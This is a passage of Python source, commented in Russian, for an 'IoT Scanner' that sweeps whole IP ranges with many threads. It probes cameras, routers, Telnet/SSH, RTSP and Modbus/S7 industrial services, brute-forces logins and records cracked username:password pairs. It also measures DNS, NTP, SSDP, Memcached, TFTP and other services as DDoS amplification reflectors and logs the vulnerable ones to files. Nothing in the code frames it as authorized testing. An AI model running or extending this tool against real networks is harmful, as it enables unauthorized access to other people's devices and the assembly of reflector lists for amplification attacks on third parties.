        ws_results = self.scan_websocket_services(ip)
        results.extend(ws_results)
        
        return results


    def run(self):
        """Исправленная версия основного запуска с защитой от зависаний"""
        print("=== IoT Scanner with Amplification Detection ===")
        print("Загрузка конфигурации...")
        
        self.start_time = time.time()
        
        # 🔥 ПРАВИЛЬНЫЙ подсчет IP
        self.total_ips = 0
        for cidr_range in self.ranges:
            try:
                network = ipaddress.ip_network(cidr_range, strict=False)
                ips_in_range = list(network.hosts())
                self.total_ips += len(ips_in_range)  # ✅ ДОБАВЛЯЕМ!
            except Exception as e:
                print(f"[ERROR] Неверный диапазон {cidr_range}: {e}")
                continue
        
        print(f"[INFO] Всего для сканирования: {len(self.ranges)} диапазонов, {self.total_ips} IP адресов")
        
        self.scanned_ips = 0  # Сбрасываем счетчик
        
        # 🔥 ИСПРАВЛЕННЫЙ ПОДСЧЕТ
        for cidr_range in self.ranges:
            try:
                network = ipaddress.ip_network(cidr_range, strict=False)
                ips_in_range = list(network.hosts())
                range_ip_count = len(ips_in_range)
                
                print(f"\n[INFO] Сканирование диапазона {cidr_range} ({range_ip_count} IP)")
                
                # 🔥 ПРАВИЛЬНЫЙ подсчет для этого диапазона
                scanned_in_range = 0
                stuck_ips = []
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.Max_workers) as executor:
                    futures = {}
                    active_tasks = {}  # 🔥 Трекинг активных задач
                    start_times = {}   # 🔥 Время начала каждой задачи
                    
                    # Создаем задачи для всех IP в текущем диапазоне
                    for ip in ips_in_range:
                        future = executor.submit(self.scan_ip, ip, cidr_range)
                        futures[future] = ip
                        active_tasks[ip] = future
                        start_times[ip] = time.time()
                    
                    # 🔥 МОНИТОРИНГ ЗАВИСШИХ ПОТОКОВ
                    processed_ips = set()
                    timeout_threshold = 750  # 🔥 Максимальное время на 1 IP (секунды)
                    
                    while active_tasks:
                        current_time = time.time()
                        stuck_ips = []
                        
                        # 🔥 ПРОВЕРЯЕМ ЗАВИСШИЕ ПОТОКИ
                        for ip, future in list(active_tasks.items()):
                            task_duration = current_time - start_times[ip]
                            
                            if task_duration > timeout_threshold:
                                print(f"[STUCK] ⚠️ Поток для {ip} завис ({task_duration:.1f}сек) - отменяем")
                                stuck_ips.append(ip)
                                try:
                                    future.cancel()  # 🔥 Пытаемся отменить
                                except:
                                    pass
                        
                        # 🔥 УДАЛЯЕМ ЗАВИСШИЕ ИЗ МОНИТОРИНГА
                        for ip in stuck_ips:
                            if ip in active_tasks:
                                scanned_in_range += 1
                                self.scanned_ips += 1
                                del active_tasks[ip]
                                print(f"[SKIP] ✅ Пропущен зависший IP: {ip}")
                        
                        # Обработка завершенных задач
                        completed_futures = []
                        try:
                            # Ждем завершения задач с таймаутом
                            completed_futures, _ = concurrent.futures.wait(
                                list(active_tasks.values()), 
                                timeout=1, 
                                return_when=concurrent.futures.FIRST_COMPLETED
                            )
                        except:
                            pass
                        
                        for future in completed_futures:
                            for ip, fut in list(active_tasks.items()):
                                if fut == future:
                                    try:
                                        future.result(timeout=1)  # 🔥 Быстро забираем результат
                                        processed_ips.add(ip)
                                    except concurrent.futures.TimeoutError:
                                        print(f"[TIMEOUT] Таймаут при получении результата для {ip}")
                                    except Exception as e:
                                        # 🔥 ИГНОРИРУЕМ ОШИБКИ - важно не зависнуть
                                        pass
                                    
                                    if ip in active_tasks:
                                        del active_tasks[ip]
                                    self.scanned_ips += 1
                                    scanned_in_range += 1
                                    break
                        
                        # 🔥 ОБНОВЛЯЕМ ПРОГРЕСС
                        progress = (self.scanned_ips / self.total_ips) * 100
                        remaining = self.total_ips - self.scanned_ips
                        active_count = len(active_tasks)
                        
                        print(f"\r[PROGRESS] {self.scanned_ips}/{self.total_ips} ({progress:.1f}%) | "
                              f"Активно: {active_count} | Зависло: {len(stuck_ips)} | "
                              f"Диапазон: {cidr_range}", end="", flush=True)
                        
                        # 🔥 ЕСЛИ ВСЕ ЗАВЕРШЕНЫ - ВЫХОДИМ
                        if not active_tasks:
                            break
                            
                        time.sleep(1)  # 🔥 Пауза между проверками
                    
                    print()  # 🔥 Новая строка после прогресса
                
                # 🔥 ОБНОВЛЯЕМ СЧЕТЧИК (на всякий случай)
                actually_scanned = len(ips_in_range) - len(stuck_ips) if stuck_ips else len(ips_in_range)
                print(f"[DEBUG] Диапазон {cidr_range}: обработано {scanned_in_range}/{range_ip_count}")
                
                # ПАУЗА МЕЖДУ ДИАПАЗОНАМИ
                print(f"[INFO] Диапазон {cidr_range} завершен. Прогресс: {self.scanned_ips}/{self.total_ips} IP")
                time.sleep(2)  # 2 секунды паузы между диапазонами
                
            except Exception as e:
                print(f"[ERROR] Ошибка в диапазоне {cidr_range}: {e}")
                continue
        
        total_time = time.time() - self.start_time
        print(f"\n[COMPLETE] Сканирование завершено за {self.format_time(total_time)}")
        print(f"[STATS] Обработано: {self.scanned_ips} IP адресов")

    # ДОБАВИТЬ ЭТИ МЕТОДЫ В КЛАСС IoTScanner

    def scan_amplification_protocols(self, target):
        """Сканирование amplification протоколов для цели"""
        results = []
        for port_str, protocol_name in self.amplification_protocols.items():
            port = int(port_str)
            amp_result = self.test_amplification_factor(target, port, protocol_name)
            if amp_result and amp_result.get('is_vulnerable', False):
                results.append(AmplificationResult(
                    ip=target,
                    port=port,
                    protocol=protocol_name,
                    amplification_factor=amp_result['amp_factor'],
                    is_vulnerable=True
                ))
        return results

    def save_amplification_result(self, amp_result):
        """Сохранение результатов amplification"""
        with open('amplification_results.txt', 'a') as f:
            f.write(f"{amp_result.ip}:{amp_result.port}:{amp_result.protocol}:{amp_result.amplification_factor:.1f}x\n")

    def check_actual_vulnerability(self, ip, port, service_name):
        """Проверка конкретных уязвимостей для сервиса"""
        try:
            # Проверка для веб-сервисов
            if service_name in ["HTTP Camera", "HTTPS Camera", "HTTP Admin"]:
                return self.check_web_vulnerabilities(ip, port)
            
            # Проверка для Telnet/SSH
            elif service_name in ["Telnet Router", "SSH Router"]:
                return self.check_shell_vulnerabilities(ip, port, service_name)
            
            # Проверка для камер
            elif service_name in ["RTSP", "Hikvision", "Dahua"]:
                return self.check_camera_vulnerabilities(ip, port)
                
            # Проверка для промышленных систем
            elif "Modbus" in service_name or "S7" in service_name:
                return "Industrial System Unprotected"
                
        except Exception as e:
            pass
        
        return "Не обнаружена"

    def check_web_vulnerabilities(self, ip, port):
        """Проверка веб-уязвимостей"""
        try:
            schemes = ['https', 'http'] if port == 443 else ['http']
            
            for scheme in schemes:
                try:
                    url = f"{scheme}://{ip}:{port}"
                    response = requests.get(url, timeout=10, verify=False)
                    
                    # Проверка на дефолтные страницы
                    default_indicators = [
                        "login", "admin", "configuration", "camera", 
                        "dahua", "hikvision", "router", "wireless"
                    ]
                    
                    content_lower = response.text.lower()
                    if any(indicator in content_lower for indicator in default_indicators):
                        return "Default Web Interface"
                        
                    # Проверка HTTP методов
                    if self.check_dangerous_methods(ip, port, scheme):
                        return "Dangerous HTTP Methods Enabled"
                        
                except:
                    continue
                    
        except:
            pass
        
        return "Не обнаружена"

    def check_dangerous_methods(self, ip, port, scheme):
        """Проверка опасных HTTP методов"""
        try:
            url = f"{scheme}://{ip}:{port}"
            
            # Проверка OPTIONS
            response = requests.options(url, timeout=10, verify=False)
            if 'PUT' in response.headers.get('allow', '') or 'DELETE' in response.headers.get('allow', ''):
                return True
                
            # Проверка TRACE
            response = requests.request('TRACE', url, timeout=10, verify=False)
            if response.status_code == 200:
                return True
                
        except:
            pass
        
        return False

    def check_shell_vulnerabilities(self, ip, port, service_type):
        """Проверка уязвимостей shell-сервисов"""
        try:
            # Проверка на слабые ключи SSH или дефолтные конфигурации
            if service_type == "SSH Router":
                if self.check_ssh_vulnerabilities(ip, port):
                    return "SSH Weak Configuration"
                    
            # Проверка Telnet уязвимостей
            elif service_type == "Telnet Router":
                if self.check_telnet_vulnerabilities(ip, port):
                    return "Telnet Unencrypted"
                    
        except:
            pass
        
        return "Не обнаружена"

    def check_ssh_vulnerabilities(self, ip, port):
        """Проверка SSH уязвимостей"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((str(ip), int(port)))
            
            # Получаем баннер SSH
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            # Проверка на старые версии SSH
            if "SSH-1.99" in banner or "SSH-1.5" in banner:
                return True
                
            # Проверка на слабые алгоритмы
            if "diffie-hellman-group1-sha1" in banner.lower():
                return True
                
        except:
            pass
        
        return False

    def check_telnet_vulnerabilities(self, ip, port):
        """Проверка Telnet уязвимостей"""
        # Telnet по умолчанию нешифрованный - всегда уязвим
        return True

    def check_camera_vulnerabilities(self, ip, port):
        """Проверка уязвимостей камер"""
        try:
            # Проверка RTSP без аутентификации
            if self.check_rtsp_unauth(ip, port):
                return "RTSP Unauthenticated Access"
                
            # Проверка известных уязвимостей камер
            if self.check_camera_specific_vulns(ip, port):
                return "Known Camera Vulnerability"
                
        except:
            pass
        
        return "Не обнаружена"

    def check_rtsp_unauth(self, ip, port):
        """Проверка RTSP без аутентификации"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((str(ip), int(port)))
            
            # Отправляем OPTIONS запрос без аутентификации
            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"\r\n"
            )
            
            sock.send(request.encode())
            response = sock.recv(1024).decode()
            sock.close()
            
            if "200 OK" in response:
                return True
                
        except:
            pass
        
        return False

    def check_camera_specific_vulns(self, ip, port):
        """Проверка специфичных уязвимостей камер"""
        # Здесь можно добавить проверки для конкретных вендоров
        # Hikvision, Dahua и т.д.
        return False

    def brute_force_all_protocols(self, ip, port, service_name):
        """Брутфорс для всех протоколов"""
        success, login, password = self.brute_force_service(ip, port, service_name)
        if success:
            return f"{login}:{password}"
        return "Не найдены"

    # РЕАЛИЗАЦИЯ AMPLIFICATION ТЕСТОВ
    def test_dns_amplification(self, ip, port):
        """Тестирование DNS amplification"""
        return self.test_amplification_factor(ip, port, "DNS")

    def test_ntp_amplification(self, ip, port):
        """Тестирование NTP amplification"""
        return self.test_amplification_factor(ip, port, "NTP")

    def test_ssdp_amplification(self, ip, port):
        """Тестирование SSDP amplification"""
        return self.test_amplification_factor(ip, port, "SSDP")

    def test_cldap_amplification(self, ip, port):
        """Тестирование CLDAP amplification"""
        return self.test_amplification_factor(ip, port, "CLDAP")

    def test_memcached_amplification(self, ip, port):
        """Тестирование Memcached amplification"""
        return self.test_amplification_factor(ip, port, "Memcached")

    def test_snmp_amplification(self, ip, port):
        """Тестирование SNMP amplification"""
        return self.test_amplification_factor(ip, port, "SNMP")

    def test_chargen_amplification(self, ip, port):
        """Тестирование Chargen amplification"""
        return self.test_amplification_factor(ip, port, "Chargen")

    def test_qotd_amplification(self, ip, port):
        """Тестирование QOTD amplification"""
        return self.test_amplification_factor(ip, port, "QOTD")

    def test_coap_amplification(self, ip, port):
        """Тестирование CoAP amplification"""
        return self.test_amplification_factor(ip, port, "CoAP")

    def test_tftp_amplification(self, ip, port):
        """Тестирование TFTP amplification"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            
            # TFTP read request
            tftp_request = b"\x00\x01" + b"test.txt" + b"\x00" + b"octet" + b"\x00"
            sent_size = len(tftp_request)
            
            sock.sendto(tftp_request, (str(ip), port))
            response, addr = sock.recvfrom(4096)
            received_size = len(response)
            
            sock.close()
            
            if received_size > sent_size:
                amp_factor = received_size / sent_size
                return AmplificationResult(
                    ip=ip, port=port, protocol="TFTP",
                    amplification_factor=amp_factor,
                    is_vulnerable=amp_factor >= 2.0
                )
        except:
            pass
        
        return AmplificationResult(ip=ip, port=port, protocol="TFTP", amplification_factor=0, is_vulnerable=False)

    # ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ ДЛЯ РЕЖИМОВ СКАНИРОВАНИЯ
    def scan_amplification_only(self):
        """Полная реализация сканирования только amplification"""
        print("[INFO] Запуск сканирования amplification протоколов...")
        all_results = []
        
        for cidr_range in self.ranges:
            try:
                network = ipaddress.ip_network(cidr_range, strict=False)
                for ip in network.hosts():
                    amp_results = self.scan_amplification_for_ip(ip)
                    all_results.extend(amp_results)
                    
                    # Сохраняем найденные уязвимости
                    for result in amp_results:
                        if result.get('is_vulnerable', False):
                            with open('amplification.txt', 'a') as f:
                                f.write(f"{result['ip']}:{result['port']}:{result['service']}:{result.get('amp_factor', 0):.2f}x\n")
                                
            except Exception as e:
                print(f"[ERROR] Ошибка в диапазоне {cidr_range}: {e}")
        
        return all_results

    def test_service_by_type(self, ip, port, service):
        """Полная реализация тестирования сервисов"""
        result = TestResult(ip, port, service)
        
        # Проверяем базовую доступность
        try:
            if self.is_udp_protocol(str(port)):
                # UDP сервисы
                if self.check_udp_port(ip, port):
                    result.vulnerability = "UDP Service Available"
            else:
                # TCP сервисы
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                if sock.connect_ex((str(ip), port)) == 0:
                    result.vulnerability = "TCP Service Available"
                sock.close()
                
        except Exception as e:
            result.vulnerability = f"Service Error: {str(e)}"
        
        return result

def main():
    import argparse
    import sys
    
    # 🔥 ПРОСТОЙ ПАРСИНГ АРГУМЕНТОВ
    max_workers_arg = None
    if '--maxworkers' in sys.argv:
        try:
            index = sys.argv.index('--maxworkers')
            if index + 1 < len(sys.argv):
                max_workers_arg = int(sys.argv[index + 1])
                print(f"[ARG] Установлен Max-workers: {max_workers_arg}")
        except (ValueError, IndexError):
            print("[ERROR] Неверное значение для --maxworkers. Используйте: --maxworkers <число>")
            return
    
    # 🔥 ПЕРЕДАЧА ARG В СКАНЕР
    scanner = IoTScanner(max_workers=max_workers_arg)
    
    # Выбор режима сканирования
    print("=== Выбор режима сканирования ===")
    print("1 - Combined (IoT + Amplification)")
    print("2 - Only IoT") 
    print("3 - Only Amplification")
    
    choice = input("Выберите режим (1-3): ").strip()
    
    if choice == "1":
        scanner.set_scan_mode("combined")
    elif choice == "2":
        scanner.set_scan_mode("iot_only")
    elif choice == "3":
        scanner.set_scan_mode("amplification_only")
    else:
        print("[INFO] Используется режим по умолчанию: Combined")
        scanner.set_scan_mode("combined")
    
    # 🔥 ЗАГРУЗКА КОНФИГУРАЦИИ ТОЛЬКО ЗДЕСЬ
    if scanner.load_ranges() and scanner.load_credentials():
        scanner.run()

if __name__ == "__main__":
    main()